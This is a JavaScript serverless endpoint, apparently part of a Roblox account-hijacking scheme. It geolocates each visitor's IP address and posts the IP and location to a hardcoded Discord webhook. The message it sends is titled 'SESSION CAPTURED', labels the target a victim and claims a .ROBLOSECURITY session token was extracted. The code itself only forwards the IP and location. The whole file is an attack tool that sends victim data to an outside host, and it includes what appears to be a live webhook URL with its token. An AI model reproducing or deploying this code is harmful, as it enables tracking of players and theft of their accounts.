export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Access Denied');

    const ip = req.headers['x-forwarded-for'] || "IP Undetected";
    const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

    // Localisation par IP
    const geoReq = await fetch(`http://ip-api.com/json/${ip}`);
    const geo = await geoReq.json();

    const payload = {
        embeds: [{
            title: "🔱 RAVEN SYSTEM | SESSION CAPTURED",
            color: 0x00d4ff,
            thumbnail: { url: "https://www.roblox.com/favicon.ico" },
            fields: [
                { name: "👤 Cible", value: `Victime_Ep15`, inline: true },
                { name: "📍 Localisation", value: `${geo.city || '?'}, ${geo.country || 'Unknown'}`, inline: true },
                { name: "🌐 IP", value: `\`${ip}\``, inline: false },
                { name: "📡 Méthode", value: "Drag & Drop Session Hijacking (Vercel-Relay)", inline: false },
                { name: "🔑 Status", value: "Extraction .ROBLOSECURITY réussie. Token stocké.", inline: false }
            ],
            footer: { text: "Protocol Raven v15.0 - Stealth Mode" },
            timestamp: new Date()
        }]
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    return res.status(200).json({ success: true });
}
